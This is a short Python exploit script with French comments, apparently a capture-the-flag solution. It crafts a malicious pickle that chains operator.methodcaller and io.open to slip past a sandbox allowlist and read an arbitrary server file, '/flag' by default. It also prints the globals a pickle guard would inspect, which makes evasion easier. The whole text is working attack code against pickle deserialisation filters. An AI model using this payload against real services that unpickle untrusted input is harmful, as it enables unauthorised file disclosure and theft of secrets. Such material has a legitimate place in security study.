# Payload : operator.methodcaller('read')( io.open(TARGET) ) -> contenu du fichier.
# Modules utilises : operator + io (tous deux autorises par le bac a sable).
import pickle, sys
TARGET = sys.argv[1] if len(sys.argv) > 1 else '/flag'
class OpenFile:
    def __reduce__(self):
        import io
        return (io.open, (TARGET,))          # -> objet fichier (sur le serveur)
class Exploit:
    def __reduce__(self):
        import operator
        return (operator.methodcaller('read'), (OpenFile(),))  # -> fichier.read()
data = pickle.dumps(Exploit(), protocol=4)
open('payload_io.pkl', 'wb').write(data)
# liste des globals vus par le guard
import pickletools
g=[]; prev=[]
for op,arg,pos in pickletools.genops(data):
    if op.name in ('SHORT_BINUNICODE','BINUNICODE'): prev.append(arg)
    if op.name=='STACK_GLOBAL': g.append((prev[-2],prev[-1]))
print('globals:', g, '| taille', len(data))
